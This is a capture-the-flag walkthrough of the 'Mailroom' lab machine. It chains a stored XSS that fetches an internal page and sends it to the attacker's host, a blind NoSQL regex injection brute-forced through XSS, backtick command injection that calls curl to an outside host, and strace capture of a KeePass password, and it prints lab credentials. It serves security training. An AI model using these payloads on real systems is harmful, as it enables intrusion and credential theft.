# Mailroom

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.58.204
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 02:08 EDT
Nmap scan report for 10.129.58.204
Host is up (0.17s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

Another HTTP port exploit. We can add `mailroom.htb` to our `/etc/hosts` file for this.

### MailRoom

Visiting port 80 reveals a basic corporate website:

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

Viewing the paces reveals that this is a PHP based website. Within the functions available on the page, we can find a Contact Us page that tells us an AI will read our query.

<figure><img src="../../.gitbook/assets/image (2326).png" alt=""><figcaption></figcaption></figure>

Interesting, perhaps we can send a request that is processed or something. However, there's not much we can go on.

The webpage itself doesn't have much, so I opted to do a `ffuf` scan on the subdomains and directories present. When fuzzing subdomains, I found `git.mailroom.htb`.

```
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mailroom.htb -H "Host: FUZZ.mailroom.htb" -fs 7748

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://mailroom.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mailroom.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 7748
________________________________________________

git                     [Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 190ms]
```

Let's add this to our hosts file and enumerate further.&#x20;

### Gitea Source Code

There was a Gitea instance on the new subdomain. I didn't manage to find any exploits pertaining to this version. Within the repos present, we can see a staffroom repo by the user `matthew`.

<figure><img src="../../.gitbook/assets/image (3610).png" alt=""><figcaption></figcaption></figure>

Interestingly, we could view this repo without logging in. Within the `auth.php` files, we can find a new subdomain.

```php
if(($user['2fa_token'] && ($now - $user['token_creation']) > 60) || !$user['2fa_token']) {
        $collection->updateOne(
          ['_id' => $user['_id']],
          ['$set' => ['2fa_token' => $token, 'token_creation' => $now]]
        );

        // Send an email to the user with the 2FA token
        $to = $user['email'];
        $subject = '2FA Token';
        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
        mail($to, $subject, $message);
    }
```

We can add this to our hosts file, but we are not authorized to visit it for some reason. Since we have source code for this website given, we can attempt to do CSRF to steal pages, and I think that the Contact Us page might be vulnerable to XSS.

When looking at the `inspect.php` file on Gitea, there's this code snippet that looks vulnerable to RCE:

```php
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

  // Parse the data between  and </p>
  $start = strpos($contents, '<p class="lead mb-0">');
  if ($start === false) {
    // Data not found
    $data = 'Inquiry contents parsing failed';
  } else {
    $end = strpos($contents, '</p>', $start);
    $data = htmlspecialchars(substr($contents, $start + 21, $end - $start - 21));
  }
}
```

This uses `shell_exec` with an argument that is not sanitised. This is the RCE point! There's a weak check for the RCE, as it does not block \`. So we have to somehow send requests to this page after logging in, as this check is present on all pages:

```php
session_start(); // Start a session
// Check if authorized
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
  header('Location: index.php'); // The user is NOT logged in, redirect back to the login page
  exit;
}
```

By checking `auth.php`, we can see that this uses Mongo to authenticate users:

```php
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
header('Content-Type: application/json');
if (!$client) {
  header('HTTP/1.1 503 Service Unavailable');
  echo json_encode(['success' => false, 'message' => 'Failed to connect to the database']);
  exit;
}
```

Doing some source code reading reveals that there is a 2FA token created, and we need this token to login by accessing `/auth.php?token=`. The script takes an email and password parameter from a POST request, and passes the unsanitised input directly to a query:

```php
if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
  }

  // Check if the email and password are correct
  $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```

So the exploit path is to somehow use NoSQL to retrieve the token, and then login. However, this seems to send the 2FA token to the user's email, so stealing it won't work. It seems that we need to somehow steal credentials from this.

Viewing the Gitea users, we can find two:

<figure><img src="../../.gitbook/assets/image (2283).png" alt=""><figcaption></figcaption></figure>

We might need to use these somehow. Also, the script seems to be vulnerable to blind NoSQL injection based on the error messages it sends. Based on the `auth.php` script, if get a `true` condition, we would get the `Check inbox for 2FA token` message. If not, we would get the `Invalid email or password` error.&#x20;

### XSS + CSRF

When we submit any queries, this is the response that we get:

<figure><img src="../../.gitbook/assets/image (3691).png" alt=""><figcaption></figcaption></figure>

If we enter a simple `<script>` tag and view the page, we can confirm that we have XSS.

<figure><img src="../../.gitbook/assets/image (1912).png" alt=""><figcaption></figcaption></figure>

This tells me that Javascript is being executed on the page, and we can attempt to steal page contents via CSRF.

I tried using some Javascript to load the `index.php` page from the staffroom repo to exploit it.

```javascript
<script>var url = "http://staff-review-panel.mailroom.htb/index.php";
var attacker = "http://10.10.16.31/out";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);</script>
```

We just have to URL encode this entire thing and submit it as part of a POST request.

{% code overflow="wrap" %}
```http
POST /contact.php HTTP/1.1
Host: mailroom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 610
Origin: http://mailroom.htb
Connection: close
Referer: http://mailroom.htb/contact.php
Upgrade-Insecure-Requests: 1



email=user%40user.com&title=%3Cscript%3Evar%20url%20%3D%20%22http%3A%2F%2Fstaff-review-panel.mailroom.htb%2Findex.php%22%3B%0Avar%20attacker%20%3D%20%22http%3A%2F%2F10.10.16.31%2Fout%22%3B%0Avar%20xhr%20%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhr.onreadystatechange%20%3D%20function%28%29%20%7B%0A%20%20%20%20if%20%28xhr.readyState%20%3D%3D%20XMLHttpRequest.DONE%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28attacker%20%2B%20%22%3F%22%20%2B%20encodeURI%28btoa%28xhr.responseText%29%29%29%0A%20%20%20%20%7D%0A%7D%0Axhr.open%28%27GET%27%2C%20url%2C%20true%29%3B%0Axhr.send%28null%29%3B%3C%2Fscript%3E&message=test
```
{% endcode %}

Then, we would receive a callback with the page contents:

<figure><img src="../../.gitbook/assets/image (3064).png" alt=""><figcaption></figcaption></figure>

We have successfully stole the page, and now we can exploit this by stealing the token via NoSQL injection as found earlier. Based on this, we can attempt to send requests to `auth.php` and possibly brute force the password for a user.&#x20;

Since we can use XSS, we can make the webpage process Javascript that is hosted on our HTTP server. First, I created a quick script to send the XSS payload and retrieve the inquiries URL that we need to visit to trigger the payload.

```python
import requests
import re
contact = 'http://10.129.61.14/contact.php'
data = 'email=test@test.com&title=test&message=%3Cscript%20src%3D%22http%3A%2F%2F10.10.16.31%2Fbrute.js%22%3C%2Fscript%3E'
headers = {
	"Content-Type":"application/x-www-form-urlencoded",
}
r = requests.post(contact, data=data, headers=headers)
inquiry = r'href=\"./inquiries/[a-z0-9]{32}.html'
inquiry = str(re.search(inquiry, r.text))
inquiry = str(inquiry.split('"')[1])
inquiry = inquiry[:-1]
inquiry = inquiry[1:]
#print(inquiry)

trigger = f'http://10.129.61.14{inquiry}'
p = requests.get(trigger)
```

Then, we need to craft a special JS script that would allow us to brute force the password, and exfiltrate it onto our web server. This can be done using regex Blind NoSQL injection.

While there is probably a way to automate this to retrieve the full password with one run, I was unable to make that work for whatever reason and could only brute force 1 character each time. Here's the Javascript code I used to brute force it:

```javascript
var char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_@!?";
var valid_pass = "";
var found_char = false;

for (let k = 0; k < char_set.length && !found_char; k++) {
    var xhr = new XMLHttpRequest();
    xhr.onload = handleResponse;
    xhr.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
    xhr.send(encodeURI('email=tristan@mailroom.htb&password[$regex]=^' + valid_pass + char_set[k] + '.*'));

    function handleResponse() {
        var response = xhr.responseText;
        if (response.includes("2FA")) {
            var call = new XMLHttpRequest();
            call.open('get', 'http://10.10.16.31/?pass=' + char_set[k], true);
            call.send();
        } else if (response.includes("Invalid password")) {
            found_char = true;
        }
    };
}
// again, i had help from ruycraft for this script!
```

With this, I was able to retrieve the password character by character:

<figure><img src="../../.gitbook/assets/image (2155).png" alt=""><figcaption></figcaption></figure>

After repeating this a load of times and resetting the machine even more times, I was able to retrieve `69trisRulez!` as the full password. This password happens to be the password to SSH in as `tristan` as well.

### Port Fowarding --> RCE

Now that we have access to the machine, we can do some port forwarding to make the website available for us. I used `chisel`:

```bash
# on tristan's 
./chisel client 10.10.16.31:1080 R:80:127.0.0.1:80
# on kali
chisel server -p 1080 --reverse
```

Then, we can add `staff-review-panel.mailroom.htb` to our `/etc/hosts` file as `127.0.0.1`. Afterwards, we can visit the website!

<figure><img src="../../.gitbook/assets/image (2524).png" alt=""><figcaption></figcaption></figure>

We already found a password, so we can login. This would cause the application to send a mail to `tristan`, which we can read in `/var/mail/tristan`.

```
Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=6daeea709d39154b9a49f900ffafcaf2
From noreply@mailroom.htb  Tue Apr 18 04:05:54 2023
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 9D922D95
        for <tristan@mailroom.htb>; Tue, 18 Apr 2023 04:05:54 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=fe298deab0eb116d330d4c126cfc9414
```

Visiting the link would refer us to the `dashboard.php`:

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

Great! We have logged in. Earlier, we found an RCE in the `inquiry_id` parameter, so let's exploit that.

```http
POST /inspect.php HTTP/1.1
Host: staff-review-panel.mailroom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://staff-review-panel.mailroom.htb
Connection: close
Referer: http://staff-review-panel.mailroom.htb/inspect.php
Cookie: PHPSESSID=258a0de5b6d723eaa26caa846646bb36
Upgrade-Insecure-Requests: 1



inquiry_id=`curl+10.10.16.31:1234/rcecfmed`
```

```
$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.129.61.100 - - [18/Apr/2023 00:08:29] code 404, message File not found
10.129.61.100 - - [18/Apr/2023 00:08:29] "GET /rcecfmed HTTP/1.1" 404 -
```

Great! Now we can simply download a shell and execute it.

<figure><img src="../../.gitbook/assets/image (2088).png" alt=""><figcaption></figcaption></figure>

Now we are in a docker container.

### Git Credentials

Within the `/var/www/staffroom` directory, we can find a `.git` repository:

```
www-data@5adcedc19d48:/var/www/staffroom$ ls -la
total 68
drwxr-xr-x 7 root root 4096 Jan 19 10:54 .
drwxr-xr-x 5 root root 4096 Jan 15 17:58 ..
drwxr-xr-x 8 root root 4096 Jan 19 10:56 .git
-rw-r--r-- 1 root root    0 Jan 15 17:59 README.md
-rwxr-xr-x 1 root root 3453 Jan 19 10:54 auth.php
-rwxr-xr-x 1 root root   62 Jan 15 17:59 composer.json
-rwxr-xr-x 1 root root 8096 Jan 15 17:59 composer.lock
drwxr-xr-x 2 root root 4096 Jan 15 17:59 css
-rwxr-xr-x 1 root root 5848 Jan 19 10:52 dashboard.php
drwxr-xr-x 3 root root 4096 Jan 15 17:59 font
-rwxr-xr-x 1 root root 2594 Jan 15 17:59 index.php
-rwxr-xr-x 1 root root 6326 Jan 18 13:26 inspect.php
drwxr-xr-x 2 root root 4096 Jan 15 17:59 js
-rwxr-xr-x 1 root root  953 Jan 15 17:59 register.html
drwxr-xr-x 6 root root 4096 Jan 15 17:59 vendor
```

We could read the logs, but since Gitea is present, there probably isn't anything that I haven't already found. Instead, we can look at `git config` to see if there are passwords:

```
www-data@5adcedc19d48:/var/www/staffroom$ git config --list
WARNING: terminal is not fully functional
-  (press RETURN)core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
remote.origin.url=http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
branch.main.remote=origin
branch.main.merge=refs/heads/main
user.email=matthew@mailroom.htb
```

Great! We cannot directly SSH into `matthew`, so we can use `su` from `tristan`. The password would be `HueLover83#`.

```
tristan@mailroom:~/.ssh$ su matthew
Password: 
matthew@mailroom:/home/tristan/.ssh$
```

Then, we can capture the user flag.

## Privilege Escalation

### KPCli Processes

When on matthew, I ran a `pspy64` to enumerate the processes running and if we could exploit them. Here's the interesting output:

```
2023/04/18 04:22:11 CMD: UID=1001 PID=81633  | /usr/bin/perl /usr/bin/kpcli 
2023/04/18 04:22:11 CMD: UID=1001 PID=81627  | /lib/systemd/systemd --user 
2023/04/18 04:22:11 CMD: UID=1001 PID=81611  | ./pspy64 
2023/04/18 04:22:11 CMD: UID=1001 PID=81318  | bash 
2023/04/18 04:22:28 CMD: UID=1001 PID=81628  | 
2023/04/18 04:22:31 CMD: UID=1001 PID=81692  | /lib/systemd/systemd --user 
2023/04/18 04:22:31 CMD: UID=1001 PID=81694  | (sd-executor)               
2023/04/18 04:22:31 CMD: UID=1001 PID=81695  | (direxec)                   
2023/04/18 04:22:31 CMD: UID=1001 PID=81696  | (sd-executor)               
2023/04/18 04:22:31 CMD: UID=1001 PID=81712  | /lib/systemd/systemd --user 
2023/04/18 04:22:31 CMD: UID=1001 PID=81713  | -bash -c /usr/bin/kpcli 
2023/04/18 04:22:31 CMD: UID=1001 PID=81714  | -bash -c /usr/bin/kpcli
```

Interestingly, there are a lot of `kpcli` processes running, which are not normal. We can also use `ps -aux` to see this:

```
matthew@mailroom:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
matthew    81318  0.0  0.1   8388  5332 pts/1    S    04:19   0:00 bash
matthew    81792  0.0  0.1   8264  4852 pts/2    S+   04:22   0:00 bash
matthew    82057  0.7  0.2  19184  9704 ?        Ss   04:24   0:00 /lib/systemd/systemd --user
matthew    82063  1.3  0.6  29436 24428 ?        Ss   04:24   0:00 /usr/bin/perl /usr/bin/kpcli
```

Within the user's home directory, there are also some kdbx files present:

```
matthew@mailroom:~$ ls
personal.kdbx  personal.kdbx.lock user.txt pspy64
```

Perhaps what's more interesting is that the PID keeps increasing, indicating that new processes keep spawning in. I used `ltrace` and `strace` to see what these processes were doing, and I found something rather interesting. When I first did it I huge list of responses, but there were a bunch of `read` instructions. As such, `-e read` was used to filter these out.

```
matthew@mailroom:/home/tristan$ strace -e read -p 82471
strace: Process 82471 attached
read(3, "R", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "s", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "-", 1)                         = 1
read(3, "f", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "0", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "q", 1)                         = 1
read(3, "u", 1)                         = 1
read(3, "i", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "\n", 1)                        = 1
read(7, "# NOTE: Derived from blib/lib/Te"..., 8192) = 665
read(7, "", 8192)                       = 0
```

This was obviously retrieving the root password each time and quitting. I interecepted the response again and got something different:

```
matthew@mailroom:/home/tristan$ strace -e read -p 82678
strace: Process 82678 attached
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "d", 8192)                      = 1
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "9", 8192)                      = 1
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55e8422dd9c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "\n", 8192)                     = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832
read(5, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\200\"\0\0\0\0\0\0"..., 832) = 832
read(5, "# XML::Parser\n#\n# Copyright (c) "..., 8192) = 8192
read(6, "package XML::Parser::Expat;\n\nuse"..., 8192) = 8192
read(6, ";\n    }\n}\n\nsub position_in_conte"..., 8192) = 8192
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240<\0\0\0\0\0\0"..., 832) = 832
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000B\0\0\0\0\0\0"..., 832) = 832
read(5, "package MIME::Base64;\n\nuse stric"..., 8192) = 5450
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300\22\0\0\0\0\0\0"..., 832) = 832
read(6, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
```

The password was obviously being passed here. After trying a bit more, we can barely retrieve the password from this.

```
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, "r", 8192)                      = 1
read(0, "3", 8192)                      = 1
<TRUNCATED>
read(0, "\10", 8192)
```

There was this \10 character present, and I didn't really know what it was. When we view the ASCII table, \10 is revealed to be a backspace character, meaning there's an intentional typo in the password. We can then use the password retrieved to access the `.kdbx` file we found.

<figure><img src="../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

Within this file was the `root` password.

```
kpcli:/Root> show -f 4

Title: root acc
Uname: root
 Pass: <REMOVED>
  URL: 
Notes: root account for sysadmin jobs
```

Now we can `su` to root and finish the machine.

<figure><img src="../../.gitbook/assets/image (1805).png" alt=""><figcaption></figcaption></figure>
